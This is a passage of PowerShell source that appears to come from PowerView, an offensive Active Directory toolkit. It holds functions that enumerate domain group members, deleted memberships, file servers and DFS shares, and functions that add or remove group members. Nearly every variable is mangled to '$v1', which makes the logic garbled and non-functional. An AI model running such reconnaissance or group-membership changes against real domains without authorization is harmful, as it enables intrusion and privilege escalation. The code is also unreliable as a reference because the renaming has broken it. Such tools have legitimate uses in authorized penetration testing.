            $v1.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $v1
        }
    }
}


function Get-DomainGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        $v1 = Get-DomainSearcher @SearcherArguments
        if ($v1) {
            if ($v1['RecurseUsingMatchingRule']) {
                $v1['Identity'] = $v1
                $v1['Raw'] = $v1
                $v1 = Get-DomainGroup @SearcherArguments

                if (-not $v1) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $v1"
                }
                else {
                    $v1 = $v1.properties.item('samaccountname')[0]
                    $v1 = $v1.properties.item('distinguishedname')[0]

                    if ($v1['Domain']) {
                        $v1 = $v1
                    }
                    else {

                        if ($v1) {
                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$v1', only user accounts will be returned."
                    $v1.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$v1))"
                    $v1.PropertiesToLoad.AddRange(('distinguishedName'))
                    $v1 = $v1.FindAll() | ForEach-Object {$v1.Properties.distinguishedname[0]}
                }
                $v1 = $v1.Remove('Raw')
            }
            else {
                $v1 = ''
                $v1 = ''
                $v1 | Where-Object {$v1} | ForEach-Object {
                    $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                    if ($v1 -match '^S-1-') {
                        $v1 += "(objectsid=$v1)"
                    }
                    elseif ($v1 -match '^CN=') {
                        $v1 += "(distinguishedname=$v1)"
                        if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$v1' from '$v1'"
                            $v1['Domain'] = $v1
                            $v1 = Get-DomainSearcher @SearcherArguments
                            if (-not $v1) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$v1'"
                            }
                        }
                    }
                    elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                        $v1 += "(objectguid=$v1)"
                    }
                    elseif ($v1.Contains('\')) {
                        $v1 = $v1.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($v1) {
                            $v1 = $v1.SubString(0, $v1.IndexOf('/'))
                            $v1 = $v1.Split('\')[1]
                            $v1 += "(samAccountName=$v1)"
                            $v1['Domain'] = $v1
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$v1' from '$v1'"
                            $v1 = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $v1 += "(samAccountName=$v1)"
                    }
                }

                if ($v1 -and ($v1.Trim() -ne '') ) {
                    $v1 += "(|$v1)"
                }

                if ($v1['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $v1"
                    $v1 += "$v1"
                }

                $v1.filter = "(&(objectCategory=group)$v1)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($v1.filter)"
                try {
                    $v1 = $v1.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$v1': $v1"
                    $v1 = @()
                }

                $v1 = ''
                $v1 = ''

                if ($v1) {
                    $v1 = $v1.properties.item('member')

                    if ($v1.count -eq 0) {

                        $v1 = $v1
                        $v1 = 0
                        $v1 = 0

                        while (-not $v1) {
                            $v1 = $v1 + 1499
                            $v1="member;range=$v1-$v1"
                            $v1 += 1500
                            $v1 = $v1.PropertiesToLoad.Clear()
                            $v1 = $v1.PropertiesToLoad.Add("$v1")
                            $v1 = $v1.PropertiesToLoad.Add('samaccountname')
                            $v1 = $v1.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $v1 = $v1.FindOne()
                                $v1 = $v1.Properties.PropertyNames -like "member;range=*"
                                $v1 += $v1.Properties.item($v1)
                                $v1 = $v1.properties.item('samaccountname')[0]
                                $v1 = $v1.properties.item('distinguishedname')[0]

                                if ($v1.count -eq 0) {
                                    $v1 = $v1
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $v1 = $v1
                            }
                        }
                    }
                    else {
                        $v1 = $v1.properties.item('samaccountname')[0]
                        $v1 = $v1.properties.item('distinguishedname')[0]
                        $v1 += $v1.Properties.item($v1)
                    }

                    if ($v1['Domain']) {
                        $v1 = $v1
                    }
                    else {

                        if ($v1) {
                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($v1 in $v1) {
                if ($v1 -and $v1) {
                    $v1 = $v1.Properties
                }
                else {
                    $v1 = $v1.Clone()
                    $v1['Identity'] = $v1
                    $v1['Raw'] = $v1
                    $v1['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $v1 = Get-DomainObject @ObjectSearcherArguments
                    $v1 = $v1.Properties
                }

                if ($v1) {
                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'GroupDomain' $v1
                    $v1 | Add-Member Noteproperty 'GroupName' $v1
                    $v1 | Add-Member Noteproperty 'GroupDistinguishedName' $v1

                    if ($v1.objectsid) {
                        $v1 = ((New-Object System.Security.Principal.SecurityIdentifier $v1.objectsid[0], 0).Value)
                    }
                    else {
                        $v1 = $v1
                    }

                    try {
                        $v1 = $v1.distinguishedname[0]
                        if ($v1 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $v1) {
                                    $v1 = $v1.cn[0]
                                }
                                $v1 = Convert-ADName -Identity $v1 -OutputType 'DomainSimple' @ADNameArguments

                                if ($v1) {
                                    $v1 = $v1.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $v1"
                                    $v1 = $v1
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $v1"
                                $v1 = $v1
                            }
                        }
                        else {

                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $v1 = $v1
                        $v1 = $v1
                    }

                    if ($v1.samaccountname) {

                        $v1 = $v1.samaccountname[0]
                    }
                    else {

                        try {
                            $v1 = ConvertFrom-SID -ObjectSID $v1.cn[0] @ADNameArguments
                        }
                        catch {

                            $v1 = $v1.cn[0]
                        }
                    }

                    if ($v1.objectclass -match 'computer') {
                        $v1 = 'computer'
                    }
                    elseif ($v1.objectclass -match 'group') {
                        $v1 = 'group'
                    }
                    elseif ($v1.objectclass -match 'user') {
                        $v1 = 'user'
                    }
                    else {
                        $v1 = $v1
                    }
                    $v1 | Add-Member Noteproperty 'MemberDomain' $v1
                    $v1 | Add-Member Noteproperty 'MemberName' $v1
                    $v1 | Add-Member Noteproperty 'MemberDistinguishedName' $v1
                    $v1 | Add-Member Noteproperty 'MemberObjectClass' $v1
                    $v1 | Add-Member Noteproperty 'MemberSID' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $v1


                    if ($v1['Recurse'] -and $v1 -and ($v1 -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $v1"
                        $v1['Identity'] = $v1
                        $v1 = $v1.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $v1
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $v1 = $v1.Properties['distinguishedname'][0]
            ForEach($v1 in $v1.Properties['msds-replvaluemetadata']) {
                $v1 = [xml]$v1 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($v1) {
                    if (($v1.pszAttributeName -Match 'member') -and (($v1.dwVersion % 2) -eq 0 )) {
                        $v1 = New-Object PSObject
                        $v1 | Add-Member NoteProperty 'GroupDN' $v1
                        $v1 | Add-Member NoteProperty 'MemberDN' $v1.pszObjectDn
                        $v1 | Add-Member NoteProperty 'TimeFirstAdded' $v1.ftimeCreated
                        $v1 | Add-Member NoteProperty 'TimeDeleted' $v1.ftimeDeleted
                        $v1 | Add-Member NoteProperty 'LastOriginatingChange' $v1.ftimeLastOriginatingChange
                        $v1 | Add-Member NoteProperty 'TimesAdded' ($v1.dwVersion / 2)
                        $v1 | Add-Member NoteProperty 'LastOriginatingDsaDN' $v1.pszLastOriginatingDsaDN
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $v1
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$v1'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'Identity' = $v1
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-PrincipalContext @ContextArguments

        if ($v1) {
            try {
                $v1 = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($v1.Context, $v1.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$v1' : $v1"
            }
        }
    }

    PROCESS {
        if ($v1) {
            ForEach ($v1 in $v1) {
                if ($v1 -match '.+\\.+') {
                    $v1['Identity'] = $v1
                    $v1 = Get-PrincipalContext @ContextArguments
                    if ($v1) {
                        $v1 = $v1.Identity
                    }
                }
                else {
                    $v1 = $v1
                    $v1 = $v1
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$v1' to group '$v1'"
                $v1 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($v1.Context, $v1)
                $v1.Members.Add($v1)
                $v1.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'Identity' = $v1
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-PrincipalContext @ContextArguments

        if ($v1) {
            try {
                $v1 = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($v1.Context, $v1.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$v1' : $v1"
            }
        }
    }

    PROCESS {
        if ($v1) {
            ForEach ($v1 in $v1) {
                if ($v1 -match '.+\\.+') {
                    $v1['Identity'] = $v1
                    $v1 = Get-PrincipalContext @ContextArguments
                    if ($v1) {
                        $v1 = $v1.Identity
                    }
                }
                else {
                    $v1 = $v1
                    $v1 = $v1
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$v1' from group '$v1'"
                $v1 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($v1.Context, $v1)
                $v1.Members.Remove($v1)
                $v1.Save()
            }
        }
    }
}


function Get-DomainFileServer {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {

            Param([String]$v1)

            if ($v1 -and ($v1.split('\\').Count -ge 3)) {
                $v1 = $v1.split('\\')[2]
                if ($v1 -and ($v1 -ne '')) {
                    $v1
                }
            }
        }

        $v1 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['Domain']) {
            ForEach ($v1 in $v1) {
                $v1['Domain'] = $v1
                $v1 = Get-DomainSearcher @SearcherArguments

                $(ForEach($v1 in $v1.FindAll()) {if ($v1.Properties['homedirectory']) {Split-Path($v1.Properties['homedirectory'])}if ($v1.Properties['scriptpath']) {Split-Path($v1.Properties['scriptpath'])}if ($v1.Properties['profilepath']) {Split-Path($v1.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $v1 = Get-DomainSearcher @SearcherArguments
            $(ForEach($v1 in $v1.FindAll()) {if ($v1.Properties['homedirectory']) {Split-Path($v1.Properties['homedirectory'])}if ($v1.Properties['scriptpath']) {Split-Path($v1.Properties['scriptpath'])}if ($v1.Properties['profilepath']) {Split-Path($v1.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $v1 = 'All'
    )

    BEGIN {
        $v1 = @{}
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $v1
            )

            $v1 = $v1
            $v1 = [bitconverter]::ToUInt32($v1[0..3],0)
            $v1 = [bitconverter]::ToUInt32($v1[4..7],0)
            $v1 = 8

            $v1 = @()
            for($v1=1; $v1 -le $v1; $v1++){
                $v1 = $v1
                $v1 = $v1 + 1
                $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)

                $v1 = $v1 + 1
                $v1 = $v1 + $v1 - 1
                $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])

                $v1 = $v1 + 1
                $v1 = $v1 + 3
                $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                $v1 = $v1 + 1
                $v1 = $v1 + $v1 - 1
                $v1 = $v1[$v1..$v1]
                switch -wildcard ($v1) {
                    "\siteroot" {  }
                    "\domainroot*" {


                        $v1 = 0
                        $v1 = 15
                        $v1 = [byte[]]$v1[$v1..$v1]
$v1 = New-Object Guid(,$v1)
                        $v1 = $v1 + 1
                        $v1 = $v1 + 1
                        $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)
                        $v1 = $v1 + 1
                        $v1 = $v1 + $v1 - 1
                        $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])

                        $v1 = $v1 + 1
                        $v1 = $v1 + 1
                        $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)
                        $v1 = $v1 + 1
                        $v1 = $v1 + $v1 - 1
                        $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])

                        $v1 = $v1 + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                        $v1 = $v1 + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                        $v1 = $v1 + 1
                        $v1 = $v1 + 1
                        $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)
                        $v1 = $v1 + 1
                        $v1 = $v1 + $v1 - 1
                        if ($v1 -gt 0)  {
                            $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])
                        }
                        $v1 = $v1 + 1
                        $v1 = $v1 + 7

$v1 = $v1[$v1..$v1]
                        $v1 = $v1 + 1
                        $v1 = $v1 + 7
                        $v1 = $v1[$v1..$v1]
                        $v1 = $v1 + 1
                        $v1 = $v1 + 7
                        $v1 = $v1[$v1..$v1]
                        $v1 = $v1  + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)


                        $v1 = $v1 + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                        $v1 = $v1 + 1
                        $v1 = $v1 + $v1 - 1
                        $v1 = $v1[$v1..$v1]
                        $v1 = $v1 + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                        $v1 = $v1 + 1
                        $v1 = $v1 + $v1 - 1
                        $v1 = $v1[$v1..$v1]
                        $v1 = $v1 + 1
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)


                        $v1 = 0
                        $v1 = $v1 + 3
                        $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)
                        $v1 = $v1 + 1

                        for($v1=1; $v1 -le $v1; $v1++){
                            $v1 = $v1
                            $v1 = $v1 + 3
                            $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)
                            $v1 = $v1 + 1
                            $v1 = $v1 + 7

                            $v1 = $v1[$v1..$v1]
                            $v1 = $v1 + 1
                            $v1 = $v1 + 3
                            $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                            $v1 = $v1 + 1
                            $v1 = $v1 + 3
                            $v1 = [bitconverter]::ToUInt32($v1[$v1..$v1],0)

                            $v1 = $v1 + 1
                            $v1 = $v1 + 1
                            $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)

                            $v1 = $v1 + 1
                            $v1 = $v1 + $v1 - 1
                            $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])

                            $v1 = $v1 + 1
                            $v1 = $v1 + 1
                            $v1 = [bitconverter]::ToUInt16($v1[$v1..$v1],0)
                            $v1 = $v1 + 1
                            $v1 = $v1 + $v1 - 1
                            $v1 = [System.Text.Encoding]::Unicode.GetString($v1[$v1..$v1])

                            $v1 += "\\$v1\$v1"
                            $v1 = $v1 + 1
                        }
                    }
                }
                $v1 = $v1 + 1
                $v1 = @{
                    'Name' = $v1
                    'Prefix' = $v1
                    'TargetList' = $v1
                }
                $v1 += New-Object -TypeName PSObject -Property $v1
                $v1 = $v1
                $v1 = $v1
                $v1 = $v1
            }

            $v1 = @()
            $v1 | ForEach-Object {
                if ($v1.TargetList) {
                    $v1.TargetList | ForEach-Object {
                        $v1 += $v1.split('\')[2]
                    }
                }
            }

            $v1
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $v1,

                [String]
                $v1,

                [String]
                $v1,

                [String]
                $v1 = 'Subtree',

                [Int]
                $v1 = 200,

                [Int]
                $v1,

                [Switch]
                $v1,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $v1 = [Management.Automation.PSCredential]::Empty
            )

            $v1 = Get-DomainSearcher @PSBoundParameters

            if ($v1) {
                $v1 = @()
                $v1.filter = '(&(objectClass=fTDfs))'

                try {
                    $v1 = $v1.FindAll()
                    $v1 | Where-Object {$v1} | ForEach-Object {
                        $v1 = $v1.Properties
                        $v1 = $v1.remoteservername
                        $v1 = $v1.pkt

                        $v1 += $v1 | ForEach-Object {
                            try {
                                if ( $v1.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$v1.name[0];'RemoteServerName'=$v1.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $v1"
                            }
                        }
                    }
                    if ($v1) {
                        try { $v1.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $v1"
                        }
                    }
                    $v1.dispose()

                    if ($v1 -and $v1[0]) {
                        Parse-Pkt $v1[0] | ForEach-Object {



                            if ($v1 -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$v1.name[0];'RemoteServerName'=$v1}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $v1"
                }
                $v1 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $v1,

                [String]
                $v1,

                [String]
                $v1,

                [String]
                $v1 = 'Subtree',

                [Int]
                $v1 = 200,

                [Int]
                $v1,

                [Switch]
                $v1,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $v1 = [Management.Automation.PSCredential]::Empty
            )

            $v1 = Get-DomainSearcher @PSBoundParameters

            if ($v1) {
                $v1 = @()
                $v1.filter = '(&(objectClass=msDFS-Linkv2))'
                $v1 = $v1.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $v1 = $v1.FindAll()
                    $v1 | Where-Object {$v1} | ForEach-Object {
                        $v1 = $v1.Properties
                        $v1 = $v1.'msdfs-targetlistv2'[0]
                        $v1 = [xml][System.Text.Encoding]::Unicode.GetString($v1[2..($v1.Length-1)])
                        $v1 += $v1.targets.ChildNodes | ForEach-Object {
                            try {
                                $v1 = $v1.InnerText
                                if ( $v1.Contains('\') ) {
                                    $v1 = $v1.split('\')[3]
                                    $v1 = $v1.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$v1$v1";'RemoteServerName'=$v1.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $v1"
                            }
                        }
                    }
                    if ($v1) {
                        try { $v1.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $v1"
                        }
                    }
                    $v1.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $v1"
                }
                $v1 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $v1 = @()

        if ($v1['Domain']) {
            ForEach ($v1 in $v1) {
                $v1['Domain'] = $v1
                if ($v1 -match 'all|1') {
                    $v1 += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($v1 -match 'all|2') {
                    $v1 += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($v1 -match 'all|1') {
